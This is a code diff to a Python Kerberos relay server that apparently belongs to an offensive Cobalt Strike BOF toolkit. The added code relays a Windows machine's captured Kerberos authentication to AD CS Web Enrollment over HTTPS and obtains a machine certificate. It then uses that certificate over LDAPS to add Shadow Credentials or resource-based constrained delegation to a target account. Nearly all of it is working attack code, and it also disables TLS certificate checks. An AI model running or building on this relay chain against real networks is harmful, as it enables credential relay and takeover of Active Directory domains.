@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
-"""Kerberos/SPNEGO relay side of the KrbRelay BOF split.
+"""Kerberos/SPNEGO relay and target adapters for the KrbRelay BOF split.
 
 The listener receives opaque DCE/RPC SPNEGO records over the KRB1 bridge and
-places each one in an HTTP ``Authorization: Negotiate`` header. IIS responses
-are returned unchanged to the BOF so Windows can complete the client side of
-mutual Kerberos authentication. Once HTTP returns 200, enrollment and
-certificate retrieval remain on that same authenticated TCP connection.
+places each one into one persistent HTTP or LDAP exchange. Target
+continuations are returned unchanged to the BOF so Windows can complete the
+client side of mutual Kerberos authentication. HTTPS can additionally issue a
+machine certificate that Python uses in memory for Schannel-authenticated
+Shadow Credential and RBCD writes to LDAPS.
 
 Run with Certipy's virtual environment because it already contains
 ``cryptography``. The default path does not print or retain authentication
@@ -107,7 +108,7 @@ class RecordChannel:
     def __init__(self, sock: socket.socket):
         self.sock = sock
         # True after AUTH_OK is sent. At that point the BOF has returned and
-        # later enrollment errors can be reported only by this process.
+        # later target-operation errors can be reported only by this process.
         self.bof_released = False
 
     def _read_exact(self, length: int) -> bytes:
@@ -151,9 +152,23 @@ class RawHttpConnection:
     which would defeat relay. This implementation deliberately handles only
     the response features IIS uses while retaining unread pipelined bytes.
     """
-    def __init__(self, host: str, address: str, port: int):
+    def __init__(self, host: str, address: str, port: int, tls: bool = False):
         self.host = host
-        self.sock = socket.create_connection((address, port), timeout=10)
+        raw = socket.create_connection((address, port), timeout=10)
+        if tls:
+            # The lab CA is not installed in the operator trust store. SNI
+            # still carries the operator-selected AD CS hostname and the
+            # Kerberos service SPN remains bound to that same hostname.
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            try:
+                self.sock = context.wrap_socket(raw, server_hostname=host)
+            except Exception:
+                raw.close()
+                raise
+        else:
+            self.sock = raw
         self.sock.settimeout(20)
         self.pending = bytearray()
 
@@ -399,12 +414,14 @@ def parse_ldap_bind_response(wire: bytes, expected_message_id: int) -> LdapBindR
 class RawLdapConnection:
     """Persistent LDAP client exposing opaque GSS-SPNEGO SASL exchanges."""
     def __init__(self, address: str, port: int, tls_hostname: Optional[str] = None,
-                 connected_socket: Optional[socket.socket] = None):
+                 connected_socket: Optional[socket.socket] = None,
+                 tls_context: Optional[ssl.SSLContext] = None):
         self.sock = connected_socket or socket.create_connection((address, port), timeout=10)
         if tls_hostname:
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
+            context = tls_context or ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            if tls_context is None:
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
             self.sock = context.wrap_socket(self.sock, server_hostname=tls_hostname)
         self.sock.settimeout(20)
         self.message_id = 0
@@ -577,7 +594,6 @@ def ldap_kerberos_token(token: bytes, leg: int) -> bytes:
     if leg == 1:
         krb5_oid_and_token_id = b"\x06\x09\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x01\x00"
         return der_value(0x60, krb5_oid_and_token_id + kerberos_tlv(token, 0x6E))
-
     ap_rep_offset = token.find(b"\x6f")
     if ap_rep_offset < 0:
         raise RelayError("SPNEGO continuation did not contain an AP-REP")
@@ -891,8 +907,16 @@ def run_session(channel: RecordChannel, options: argparse.Namespace) -> Certific
     log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
     client_trace = trace_name(options.machine)
     server_trace = trace_name(options.adcs_host)
-    log(f"Opening one persistent TCP connection to {options.adcs_address}:{options.adcs_port} with Host {options.adcs_host}")
-    http = RawHttpConnection(options.adcs_host, options.adcs_address, options.adcs_port)
+    use_tls = getattr(options, "adcs_tls", False)
+    scheme = "HTTPS" if use_tls else "HTTP"
+    log(
+        f"Opening one persistent {scheme} connection to "
+        f"{options.adcs_address}:{options.adcs_port} with Host {options.adcs_host}"
+    )
+    http = RawHttpConnection(
+        options.adcs_host, options.adcs_address, options.adcs_port,
+        use_tls,
+    )
     try:
         log(f"Priming IIS with an unauthenticated GET {options.auth_path}")
         probe = http.request("GET", options.auth_path)
@@ -1215,6 +1239,98 @@ def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
         ldap.close()
 
 
+def machine_schannel_context(bundle: CertificateBundle) -> ssl.SSLContext:
+    """Load an issued machine identity into TLS without retaining key files.
+
+    Python's OpenSSL binding accepts client keys only by filename. Linux memfd
+    paths satisfy that API while keeping both PEM values anonymous and
+    automatically destroying them as soon as the SSLContext has copied them.
+    """
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+    cert_fd = os.memfd_create("krbrelay-schannel-cert", os.MFD_CLOEXEC)
+    key_fd = os.memfd_create("krbrelay-schannel-key", os.MFD_CLOEXEC)
+    try:
+        os.write(cert_fd, bundle.certificate.public_bytes(serialization.Encoding.PEM))
+        os.write(key_fd, bundle.private_key.private_bytes(
+            serialization.Encoding.PEM,
+            serialization.PrivateFormat.PKCS8,
+            serialization.NoEncryption(),
+        ))
+        context.load_cert_chain(f"/proc/self/fd/{cert_fd}", f"/proc/self/fd/{key_fd}")
+    finally:
+        os.close(cert_fd)
+        os.close(key_fd)
+    return context
+
+
+def run_schannel_ldap(bundle: CertificateBundle, options: argparse.Namespace):
+    """Use the relayed machine certificate for a true LDAPS directory write.
+
+    The HTTP relay has already completed and the BOF has returned. AD maps the
+    client certificate during the TLS handshake, so no SASL integrity layer is
+    negotiated on top of LDAPS and ordinary RFC4511 requests are valid.
+    """
+    log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
+    if options.mode == "shadowcred":
+        requests, result, target = prepare_shadow_credential(options)
+    else:
+        requests, result = prepare_rbcd_pipeline(options)
+        target = result.target
+
+    preconnected = None
+    if options.ldap_socks_port:
+        preconnected = socks5_connect(
+            options.ldap_socks_address, options.ldap_socks_port,
+            options.ldap_address, options.ldap_port,
+        )
+    log(
+        f"Opening LDAPS connection to {options.ldap_address}:{options.ldap_port} "
+        "with the relayed machine certificate"
+    )
+    ldap = RawLdapConnection(
+        options.ldap_address, options.ldap_port, options.ldap_host,
+        preconnected, machine_schannel_context(bundle),
+    )
+    try:
+        # Query the authorization identity first so a certificate that failed
+        # AD's Schannel mapping cannot be mistaken for an authorized write.
+        operations = [(
+            0x77,
+            ber_tlv(0x80, b"1.3.6.1.4.1.4203.1.11.3"),
+        )] + requests
+        packet = bytearray()
+        ids = []
+        for operation_tag, body in operations:
+            ldap.message_id += 1
+            ids.append((ldap.message_id, operation_tag + 1))
+            packet.extend(ber_tlv(
+                0x30,
+                ber_integer(ldap.message_id) + ber_tlv(operation_tag, body),
+            ))
+        ldap.sock.sendall(packet)
+        identity = collect_pipelined_attack(ldap, ids, log)
+        expected_identity = (
+            f"u:{options.domain.split('.')[0]}\\{options.machine.rstrip('$')}$"
+        )
+        if identity.lower() != expected_identity.lower():
+            raise RelayError(
+                f"LDAPS mapped the certificate to unexpected identity {identity or '<empty>'}"
+            )
+        if options.mode == "shadowcred":
+            print(f"[+] Added Shadow Credential to {target} over LDAPS", flush=True)
+        else:
+            print(
+                f"[+] RBCD delegate added over LDAPS: {result.delegate} "
+                f"({result.sid}) -> {target}",
+                flush=True,
+            )
+        return result
+    finally:
+        ldap.close()
+
+
 # ---------------------------------------------------------------------------
 # Optional external DCE/RPC association forwarders
 # ---------------------------------------------------------------------------
@@ -1276,7 +1392,8 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
     parser.add_argument("--mode", choices=("adcs", "shadowcred", "rbcd"), default="adcs")
     parser.add_argument("--adcs-host", help="HTTP Host header and service-SPN hostname")
     parser.add_argument("--adcs-address", help="HTTP target address")
-    parser.add_argument("--adcs-port", type=int, default=80)
+    parser.add_argument("--adcs-port", type=int)
+    parser.add_argument("--adcs-tls", action="store_true", help="use HTTPS for Web Enrollment")
     parser.add_argument("--auth-path", default="/certsrv/")
     parser.add_argument("--enroll-path", default="/certsrv/certfnsh.asp")
     parser.add_argument("--certificate-path", default="/certsrv/certnew.cer")
@@ -1286,6 +1403,10 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
     parser.add_argument("--ldap-socks-address", default="127.0.0.1")
     parser.add_argument("--ldap-socks-port", type=int)
     parser.add_argument("--ldap-tls", action="store_true", help="wrap direct LDAP in TLS")
+    parser.add_argument(
+        "--schannel-bootstrap", action="store_true",
+        help="relay to HTTPS, then use the issued machine identity on LDAPS",
+    )
     parser.add_argument("--ldap-target", help="target account (default: MACHINE$)")
     parser.add_argument("--ldap-target-dn", help="exact target DN")
     parser.add_argument("--delegate-account", help="controlled SPN account granted RBCD rights")
@@ -1348,9 +1469,32 @@ def publish_bundle(bundle: CertificateBundle, options: argparse.Namespace) -> No
 def main(argv: list[str]) -> int:
     """Accept the requested number of authorized bridge peers."""
     options = parse_args(argv)
+    if options.adcs_port is None:
+        options.adcs_port = 443 if options.adcs_tls else 80
     if options.ldap_port is None:
         options.ldap_port = 636 if options.ldap_tls else 389
-    if options.mode == "adcs":
+    if options.mode != "adcs" and options.ldap_tls and not options.schannel_bootstrap:
+        raise SystemExit(
+            "direct Kerberos SASL over LDAPS is incompatible with the RPC "
+            "integrity layer; add --schannel-bootstrap and HTTPS options"
+        )
+    if options.schannel_bootstrap:
+        if options.mode == "adcs":
+            raise SystemExit("--schannel-bootstrap requires shadowcred or rbcd mode")
+        if not options.adcs_tls or not options.ldap_tls:
+            raise SystemExit("--schannel-bootstrap requires --adcs-tls and --ldap-tls")
+        required = (
+            "adcs_host", "adcs_address", "template", "ldap_host",
+            "ldap_address", "domain", "machine",
+        )
+        for path in ("auth_path", "enroll_path", "certificate_path"):
+            if not getattr(options, path).startswith("/"):
+                raise SystemExit(f"--{path.replace('_', '-')} must be an absolute path")
+        if options.mode == "shadowcred" and not (options.pfx_out or options.export_pfx_b64):
+            raise SystemExit("shadowcred mode requires --pfx-out or --export-pfx-b64")
+        if options.mode == "rbcd" and not options.delegate_sid:
+            raise SystemExit("rbcd mode requires --delegate-sid")
+    elif options.mode == "adcs":
         required = ("adcs_host", "adcs_address", "domain", "machine", "template")
         for path in ("auth_path", "enroll_path", "certificate_path"):
             if not getattr(options, path).startswith("/"):
@@ -1380,7 +1524,8 @@ def main(argv: list[str]) -> int:
     }
     service_spn = (
         f"http/{options.adcs_host}"
-        if options.mode == "adcs" else f"ldap/{options.ldap_host}"
+        if options.mode == "adcs" or options.schannel_bootstrap
+        else f"ldap/{options.ldap_host}"
     )
     print(
         f"[*] Matching Beacon command: krbrelay {options.port} "
@@ -1407,10 +1552,19 @@ def main(argv: list[str]) -> int:
                         f"{session_number}/{options.count} from {peer[0]}", flush=True,
                     )
                 try:
-                    outcome = (
-                        run_session(channel, options)
-                        if options.mode == "adcs" else run_ldap_session(channel, options)
-                    )
+                    if options.schannel_bootstrap:
+                        requested_mode = options.mode
+                        options.mode = "adcs"
+                        try:
+                            machine_bundle = run_session(channel, options)
+                        finally:
+                            options.mode = requested_mode
+                        outcome = run_schannel_ldap(machine_bundle, options)
+                    else:
+                        outcome = (
+                            run_session(channel, options)
+                            if options.mode == "adcs" else run_ldap_session(channel, options)
+                        )
                     if options.mode != "rbcd":
                         publish_bundle(outcome, options)
                     print(
